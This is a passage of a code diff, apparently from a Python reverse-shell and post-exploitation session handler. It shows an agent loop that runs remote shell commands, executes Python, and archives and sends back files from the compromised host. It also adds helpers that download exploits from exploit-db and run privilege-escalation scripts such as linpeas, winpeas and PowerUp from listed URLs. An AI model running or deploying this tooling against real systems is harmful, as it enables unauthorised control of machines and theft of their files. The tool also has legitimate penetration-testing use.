-								respond(Messenger.RESPONSE, str(1).encode())
-							else:
-								respond(Messenger.RESPONSE, "OK".encode())
-								respond(Messenger.RESPONSE, str(0).encode())
-								if agent.pipe_name:
-									respond(Messenger.RESPONSE, shebang)
-									agent.pipe_name = None
-
-						elif _type == Messenger.DOWNLOAD:
-							try:
-								items = glob.glob(os.path.expanduser(_value.decode()))
-								if not items:
-									raise Exception("No such file or directory: " + _value.decode())
-
-								buffer = bufferclass()
-								tar = tarfile.open(name="", mode='w:gz', fileobj=buffer)
-								tar.add = handle_exceptions(tar.add)
-								for item in items:
-									tar.add(item)
-								actual_size = sum([item.size for item in tar])
-								tar.close()
-
-								data = buffer.getvalue()
-
-							except:
-								_, e, _ = sys.exc_info()
-								respond(Messenger.RESPONSE, str(-1).encode())
-								respond(Messenger.RESPONSE, str(e).encode())
-							else:
-								respond(Messenger.RESPONSE, str(len(data)).encode())
-								respond(Messenger.RESPONSE, str(actual_size).encode())
-								respond(Messenger.RESPONSE, data)
-
-						elif _type == Messenger.PYTHON_EXEC:
-							result = None
-							_locals = locals()
-							{}
-							result = _locals['result']
-							if result:
-								respond(Messenger.RESPONSE, str(result).encode())
-
-						elif _type == Messenger.SHELL_EXEC:
-							result = os.popen(_value.decode()).read()
-							respond(Messenger.RESPONSE, str(result).encode())
-
-						elif _type == Messenger.TASK:
-							taskid = _value[:8]
-							cmd = _value[8:]
-							_stdin = None
-							if taskid in pipes:
-								_stdin = pipes[taskid][0]
-							process = subprocess.Popen(cmd.decode(), shell=True, stdin=_stdin,
-								stdout=subprocess.PIPE, stderr=subprocess.PIPE) # TODO stderr
-							if _stdin:
-								del pipes[taskid]
-							out = process.stdout.fileno()
-							err = process.stderr.fileno()
-							rlist.extend([out, err])
-							tasks[out] = taskid + "1".encode()
-							tasks[err] = taskid + "2".encode()
-							respond(Messenger.RESPONSE, str(process.pid).encode())
-
-				elif readable in tasks:
-					data = os.read(readable, NET_BUF_SIZE)
-					respond(Messenger.TASK_RESPONSE, tasks[readable] + data)
+				# Outgoing streams
+				else:
+					data = os.read(readable.fileno(), NET_BUF_SIZE)
+					readable.write(data)
 					if not data:
 						rlist.remove(readable)
-						del tasks[readable]
+						readable.terminate()
 
 			for writable in wfds:
+
 				if writable is pty.STDOUT_FILENO:
 					sendbuf = outbuf
+					wlock.acquire()
+
 				elif writable is master_fd:
 					sendbuf = ttybuf
 
 				try:
 					sent = os.write(writable, sendbuf.getvalue())
 				except OSError:
+					if sendbuf is outbuf:
+						wlock.release()
 					break
 
 				sendbuf.seek(sent)
@@ -2906,6 +3237,8 @@ def agent():
 				sendbuf.write(remaining)
 				if not remaining:
 					wlist.remove(writable)
+				if sendbuf is outbuf:
+					wlock.release()
 
 	except:
 		_, e, t = sys.exc_info()
@@ -2914,7 +3247,7 @@ def agent():
 		traceback.print_stack()
 
 	os.close(master_fd)
-	os.waitpid(pid, 0)[1]
+	os.waitpid(shell_pid, 0)[1]
 
 	os.kill(os.getppid(), signal.SIGKILL) # TODO
 
@@ -2995,24 +3328,21 @@ class Interfaces:
 	def list(self):
 		if OS == 'Linux':
 			if shutil.which("ip"):
-				output = subprocess.check_output(['ip', 'a']).decode()
-				interfaces = re.findall(r'(?m)(?<=^ {4}inet )([^ /]*).* ([^ ]*)$', output)
-				return {i[1]:i[0] for i in interfaces}
+				output = subprocess.check_output(['ip', 'addr']).decode()
+				interfaces = re.findall(r'^\d+: (\w+):.*?\n\s+inet (\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)
 			else:
 				logger.error("'ip' command is not available")
 				return dict()
 
 		elif OS == 'Darwin':
-			_list = dict()
 			if shutil.which("ifconfig"):
-				output = re.sub('\n\s', ' ', subprocess.check_output(['ifconfig']).decode())
-				for line in output.splitlines():
-					result = re.search('^([^:]*).*inet ([^ ]*)', line)
-					if result:
-						_list[result[1]] = result[2]
+				output = subprocess.check_output(['ifconfig']).decode()
+				interfaces = re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)
 			else:
 				logger.error("'ifconfig' command is not available")
-			return _list
+				return dict()
+
+		return {i[0]:i[1] for i in interfaces}
 
 	@property
 	def list_all(self):
@@ -3131,8 +3461,8 @@ class PBar:
 
 class paint:
 	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
-	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'white':7, 'orange':136}
-	_escape = lambda codes: f"\x1b[{codes}m"
+	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'white':231, 'orange':136}
+	_escape = lambda codes: f"\001\x1b[{codes}m\002"
 
 	def __init__(self, text=None, colors=None):
 		self.text = str(text) if text is not None else None
@@ -3197,16 +3527,26 @@ def ControlC(num, stack):
 
 def WinResize(num, stack):
 	if core.attached_session is not None and core.attached_session.type == "PTY":
-		threading.Thread(target=core.attached_session.update_pty_size, name="RESIZE").start()
+		core.attached_session.update_pty_size()
+
+def handle_exceptions(func):
+	def inner(*args, **kwargs):
+		try:
+			func(*args, **kwargs)
+		except:
+			_, e, _ = sys.exc_info()
+			logger.error(e)
+	return inner
 
 # CONSTANTS
 OS = platform.system()
 OSes = {'Unix':'🐧', 'Windows':'💻'}
 TTY_NORMAL = termios.tcgetattr(sys.stdin)
 DISPLAY = 'DISPLAY' in os.environ
-NET_BUF_SIZE = 8192
+NET_BUF_SIZE = 16384
 LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 MESSENGER = inspect.getsource(Messenger)
+STREAM = inspect.getsource(Stream)
 AGENT = inspect.getsource(agent)
 BINARIES = {
 	'socat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
@@ -3217,10 +3557,13 @@ BINARIES = {
 	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
 }
 
-
 # INITIALIZATION
 signal.signal(signal.SIGINT, ControlC)
 signal.signal(signal.SIGWINCH, WinResize)
+try:
+	import readline
+except ImportError:
+	readline = None
 
 ## CREATE BASIC OBJECTS
 core = Core()
@@ -3268,10 +3611,10 @@ class Options:
 				'description':'Run the latest version of PEASS-ng in the background',
 				'actions':{
 					'Unix':[
-						f"task {BINARIES['linpeas']}"
+						f"script {BINARIES['linpeas']}"
 					],
 					'Windows':[
-						f"task {BINARIES['winpeas']}"
+						f"script {BINARIES['winpeas']}"
 					]
 				}
 			}
@@ -3411,6 +3754,71 @@ if DEV_MODE:
 	logger.setLevel('DEBUG')
 	options.max_maintain = 50
 	options.no_bins = 'python,python3,script'
+
+def get_glob_size(_glob, block_size):
+	import glob
+	from math import ceil
+	def size_on_disk(filepath):
+		try:
+			return ceil(float(os.lstat(filepath).st_size) / block_size) * block_size
+		except:
+			return 0
+	total_size = 0
+	for part in shlex.split(_glob):
+		for item in glob.glob(os.path.expanduser(part)):
+			if os.path.isfile(item):
+				total_size += size_on_disk(item)
+			elif os.path.isdir(item):
+				for root, dirs, files in os.walk(item):
+					for file in files:
+						filepath = os.path.join(root, file)
+						total_size += size_on_disk(filepath)
+	return total_size
+
+def url_to_bytes(URL):
+
+	# URLs with special treatment
+	URL = re.sub(
+		"https://www.exploit-db.com/exploits/",
+		"https://www.exploit-db.com/download/",
+		URL
+	)
+
+	req = urllib.request.Request(URL, headers={'User-Agent': options.useragent})
+
+	logger.info(paint(f"--- ⇣  Downloading {URL}").blue)
+	ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()
+
+	while True:
+		try:
+			response = urllib.request.urlopen(req, context=ctx, timeout=options.short_timeout)
+			break
+		except urllib.error.HTTPError as e:
+			logger.error(e)
+		except urllib.error.URLError as e:
+			logger.error(e.reason)
+			if type(e.reason) == ssl.SSLCertVerificationError:
+				answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N)")
+				if answer.lower() == 'y': # Trust the cert
+					ctx = ssl._create_unverified_context()
+					continue
+			else:
+				answer = ask("Connection error. Try again? (Y/n)")
+				if answer.lower() == 'n': # Trust the cert
+					pass
+				else:
+					continue
+		return None
+
+	filename = response.headers.get_filename()
+	if filename:
+		filename = filename.strip('"')
+	elif URL.split('/')[-1]:
+		filename = URL.split('/')[-1]
+	else:
+		filename = URL.split('/')[-2]
+	data = response.read()
+	return filename, data
 
 def listener_menu():
 	if not core.listeners:
